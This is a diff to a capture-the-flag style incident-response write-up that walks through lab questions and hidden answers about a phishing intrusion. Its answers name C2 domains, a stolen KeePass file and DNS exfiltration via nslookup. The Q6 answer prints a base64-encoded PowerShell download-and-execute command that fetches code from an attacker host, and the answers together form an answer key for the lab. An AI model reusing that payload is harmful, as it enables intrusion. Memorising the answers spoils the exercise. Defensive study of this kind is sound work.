@@ -68,5 +68,154 @@ Now the task asks us to download the attachment, which is a .zip file, and then 
   </div>
 </details>
 
+### Q5: What is the password of the encrypted attachment?
+
+We already know this information, we can find it in the email.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    Invoice2023!
+  </div>
+</details>
+
+### Q6: Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?
+
+Here we need to use the tool lnkparser, we have an example in the task. Once we do it wi will find a field with the name `Command line arguments`, there we will find a command which last part is some encoded string, we just have to paste that for the answer we dont have to decode it.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
+  </div>
+</details>
+
+## Task 3
+
+### Q7: What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)
+
+Now we will use the powershell log provided, parsing it with the jq tool. For this one I used this command:
+`cat powershell.json | jq '.ScriptBlockText' | less`
+I wanted to obtain information related to commands executed, then I had to scroll investigating the results, we will nnot need to scroll too much to find the answer.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+cdn.bpakcaging.xyz,files.bpakcaging.xyz
+  </div>
+</details>
+
+### Q8: What is the name of the enumeration tool downloaded by the attacker?
+
+Using the same query I was searching for the download files, we can add a grep to try to find it easier. In this case its a tool that is open source.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    seatbelt
+  </div>
+</details>
+
+### Q9: What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.
+
+Again using the same query, but using the grep command to search for the sq3.exe, and we will find the relative path, in order to complete the path we should find the name of the user, for example you can try to search for the `Users` folder to see if there is an absolute path with the name of the user in it, and then we will have it.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite
+  </div>
+</details>
 
 
+### Q10: What is the software that uses the file in Q3?
+
+We have the answer in the previous question if we take a look at the obtained path.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    Microsoft Sticky Notes
+  </div>
+</details>
+
+### Q11: What is the name of the exfiltrated file?
+
+For this one I didn't find a easier way than looking at the same query as before, just trying to find references to a document or file.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    protected_data.kdbx
+  </div>
+</details>
+
+### Q12: What type of file uses the .kdbx file extension?
+
+If we don't know the answer we can find it just by searching on the internet about this extension.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    KeePass
+  </div>
+</details>
+
+### Q13: What is the encoding used during the exfiltration attempt of the sensitive file?
+
+Here we have some help from the attacker that names a variable as the encoding, anyways we can try to understand some of the commands that executes to try to find the encoding.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    Hex
+  </div>
+</details>
+
+### Q14: What is the tool used for exfiltration?
+
+For this one I analized the next commands in order to see if there was something interesting, at some point we will find a code that is reading the file, and also as a hit we have a message of completition, once we find it we will see the tool used.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    nslookup
+  </div>
+</details>
+
+### Q15: What software is used by the attacker to host its presumed file/payload server?
+
+Now we have to move to `Wireshark`, there we have to take a look at the response of the server where the attacker downloads its files, we already know the two domains that the attacker uses, so checking the headers of the responses we will find the answer.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    python
+  </div>
+</details>
+
+### Q16: What HTTP method is used by the C2 for the output of the commands executed by the attacker?
+
+Filtering by http we will find a clear view if we didnt do it before, now we can try to identify which is the command for the output, from the previous task we already know some of the commands used and which ones outputs information, if we search for it we will find the answer.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    POST
+  </div>
+</details>
+
+### Q17: What is the protocol used during the exfiltration activity?
+
+For this one we just have to see where the HTTP packets ends and which ones starts massively.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    DNS
+  </div>
+</details>
+
+### Q18: What is the password of the exfiltrated file?
+
+Extract the data from DNS querys
